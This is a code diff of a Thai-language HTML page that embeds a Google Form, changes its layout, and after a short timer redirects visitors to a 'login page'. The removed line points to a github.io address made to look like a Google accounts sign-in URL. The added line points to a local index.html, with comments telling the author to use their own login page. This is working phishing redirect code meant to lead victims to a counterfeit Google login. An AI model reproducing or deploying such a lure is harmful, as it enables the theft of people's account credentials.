@@ -11,16 +11,21 @@
             margin: 0;
             padding: 0;
             background-color: #f9f3e7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
         }
 
         .form-container {
-            width: 80%;
-            height: 100vh;
-            margin: 0 auto;
-            padding: 20px;
+            width: 90%;
+            max-width: 800px;
+            height: 80vh;
             background-color: white;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
+            padding: 20px;
         }
 
         iframe {
@@ -33,16 +38,15 @@
 <body>
 
     <div class="form-container">
-        <!-- ฝัง Google Form -->
-        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdQ_uaHQolMBnG_Kncbf9b6kcPHIZ1CShw2mSvDX9Ci4zw5Jg/viewform?embedded=true" 
-                frameborder="0" marginheight="0" marginwidth="0">กำลังโหลด…</iframe>
+        <h2>กำลังโหลดแบบฟอร์ม...</h2>
+        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdQ_uaHQolMBnG_Kncbf9b6kcPHIZ1CShw2mSvDX9Ci4zw5Jg/viewform?embedded=true"
+                frameborder="0">กำลังโหลด…</iframe>
     </div>
 
     <script>
-        // รอ 1 วินาทีหลังจากเข้าเว็บแล้วเปลี่ยนไปที่หน้าล็อกอิน
         setTimeout(function() {
-            window.location.href = "https://dark123351.github.io/https-accounts.google.com-v3-signin-identifier-continue-https-3A-2F-2Fmyaccount.google.com-3Futm_so/"; // เปลี่ยนเป็น URL ของหน้าล็อกอินที่คุณทำ
-        }, 3000); // 3000 ms = 3 วินาที
+            window.location.href = "index.html"; // เปลี่ยนเป็นหน้าล็อกอินของคุณ
+        }, 2000); // 2000 ms = 2 วินาที
     </script>
 
 </body>
